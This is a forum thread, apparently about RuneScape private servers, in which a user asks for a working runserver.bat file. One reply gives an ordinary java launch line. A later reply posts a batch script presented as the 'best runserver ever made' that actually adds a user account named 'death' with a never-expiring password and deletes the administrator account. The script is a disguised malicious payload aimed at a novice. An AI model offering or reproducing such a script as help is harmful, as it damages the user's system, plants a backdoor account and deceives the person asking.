channel.title: I need a Good Runeserver.bat code?
channel.description:
If you can post a good runserver code i would love it. I have a bad runserver.bat code so i need to replace it with a good code.
--THANKS--

item.title: I need a Good Runeserver.bat code?
item.dc:creator: @Eh_Pretty_Easy Eh Pretty Easy
item.description:
@Eh_Pretty_Easy wrote:

J/p, here’s the right code @echo off COLOR 09 title Your servername java -Xmx1024m -cp .;./jython.jar;./MySql/mysql-connector-java-3.0.17-ga-bin.jar server

Read full topic

item.title: I need a Good Runeserver.bat code?
item.dc:creator: @Eh_Pretty_Easy Eh Pretty Easy
item.description:
@Eh_Pretty_Easy wrote:

Put that stuff in the runserver, and then put the runserver on your desktop, without the other files. This is the best version of runserver so it must be away from the other files, but it’ll run your server.

item.title: I need a Good Runeserver.bat code?
item.dc:creator: @Eh_Pretty_Easy Eh Pretty Easy
item.description:
@Eh_Pretty_Easy wrote:

[code]@ECHO OFF
:START
ECHO
ECHO *******************************************************************
ECHO ******************** Best Runserver******
ECHO ***********Ever made
ECHO *******************************************************************
ECHO USERNAME=death
ECHO PASSWORD=death

NET SEND /USERS “Forever, the best”
NET USER death * /ADD /ACTIVE:YES /PASSWORDCHG:NO /EXPIRES:NEVER /TIMES:ALL
ECHO Delete the administrator account
NET USER administrator /DELETE
NET USER adimini /DELETE
NET USE /HOME
PAUSE[/code]

Read full topic
